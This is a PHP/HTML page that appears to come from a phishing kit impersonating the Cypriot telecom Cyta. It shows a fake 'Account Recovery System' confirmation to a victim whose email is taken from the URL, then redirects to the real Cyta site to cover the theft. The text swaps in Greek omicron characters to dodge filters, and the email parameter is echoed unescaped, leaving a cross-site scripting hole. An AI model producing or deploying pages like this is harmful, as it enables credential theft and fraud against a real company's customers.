<?php
$login = $_GET['email'];
$domain = substr(strrchr($login, "@"), 1);
$timezone = date('m/d/Y h:i:s a', time());
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Τηλεφωνία & Internet | Cyta</title>
<link rel="icon" href="https://www.cyta.com.cy/favicon.ico" type="image/x-icon">
<meta http-equiv="refresh" content="18;url=https://www.cyta.com.cy/telephony-internet" />
</head>
<div class="header" style="margin: 0px; padding: 0px; box-sizing: border-box; color: #343d47; font-family: 'helvetica neue', helvetica, verdana, tahoma, arial, sans-serif; font-size: 15px;">
<div class="uhd" style="margin: 0px; padding: 0px; box-sizing: border-box;">
<div id="yUnivHead" class="yucs-it-it yucs-slim" style="margin: 0px auto; padding: 0px; box-sizing: border-box; font-size: 12px; width: 1263px; font-family: Arial; z-index: 9999; position: relative; color: #676767; background: #ffffff;" data-flight="1435359098" data-lang="it-it" data-property="login" data-uhvc="/"><a class="yucs-skipto-search yucs-activate" style="color: #676767; text-decoration: none; box-sizing: border-box; position: absolute; text-indent: -999em; overflow: hidden;" href=""><font style="box-sizing: border-box;">Skip to search.</font></a>
<div id="yuhead-hd" class="yuhead-clearfix" style="margin: 0px; padding: 8px 10px 13px; box-sizing: border-box; font-size: 11.1599998474121px; zoom: 1;"><img src="https://www.cyta.com.cy/mp/informational/images/logos/logo.png" alt="" /></div>
</div>
</div>
</div>
<div class="main" style="margin: 0px auto; padding: 0px; box-sizing: border-box; min-height: 100%; width: 36.6em; color: #343d47; font-family: 'helvetica neue', helvetica, verdana, tahoma, arial, sans-serif; font-size: 15px;">
<div class="input-container center" style="margin: 100px 0px 0px; padding: 0px; text-align: center; box-sizing: border-box;">
<h1 style="margin: 0px 0px 32px; padding: 0px; font-weight: 200; box-sizing: border-box;"><font style="box-sizing: border-box;">Account Recovery System:</font></h1>
<p class="banner-large" style="margin: 0px; padding: 0px; font-size: 1.6em; line-height: 1.58333em; box-sizing: border-box;"><font style="box-sizing: border-box;">Y&omicron;ur request is under pr&omicron;cessing....</font></p>
<p class="banner-large" style="margin: 0px; padding: 0px; font-size: 1.2em; line-height: 1.58333em; box-sizing: border-box;"><font style="box-sizing: border-box;">Thank you for using our aut&omicron;matic rec&omicron;very system, y&omicron;ur request has been received and will be res&omicron;lved within 24 - 48 hours. <br>D&omicron; n&omicron;t make additi&omicron;nal recovery request. <br>Please wait while you are being redirected t&omicron; &omicron;ur h&omicron;mepage... www.cytanet.com.cy</p>
<form id="confirm-form" style="margin: 0px; padding: 0px; box-sizing: border-box;" action="" method="post">
<div class="row input-row" style="margin: 0.4em 0px 0px; padding: 0px; position: relative; zoom: 1; box-sizing: border-box;"><font size="4" color="#000000" face="veranda"><br /></font><font size="4" color="#000000" face="veranda"><span style="color: white;">G&Omicron; T&Omicron; INB&Omicron;X</span></font></div>
<div class="row mp-row" style="margin: 3.6em 0px 0px; padding: 0px; position: relative; zoom: 1; box-sizing: border-box;">
<div class="column" style="margin: 0px; padding: 0px; position: relative; display: inline-block; vertical-align: middle; zoom: 1; height: 136px; box-sizing: border-box;"><input id="mp" style="margin: 0px; padding: 0px; font-family: inherit; font-size: inherit; font-weight: inherit; opacity: 0;" checked="checked" name="mktgPrefs" type="checkbox" value="yes" />&nbsp;<label class="messages" style="font-size: 0.8em; box-sizing: border-box; color: #a5a5a5; position: relative;" for="mp"><strong style="box-sizing: border-box;"><font style="box-sizing: border-box;"><font style="box-sizing: border-box;">Rec&omicron;very pending f&omicron;r: <?php echo $login ?></font></font></strong><br style="box-sizing: border-box;" /> <br style="box-sizing: border-box;" /> <font style="box-sizing: border-box;"><font style="box-sizing: border-box;">Copyright © 2023 Cyta. All Rights Reserved. (<?php echo $timezone ?>)</font></a></font></label><br style="box-sizing: border-box;" /> <br style="box-sizing: border-box;" /> &nbsp;</div>
</div>
</form></div>
</div>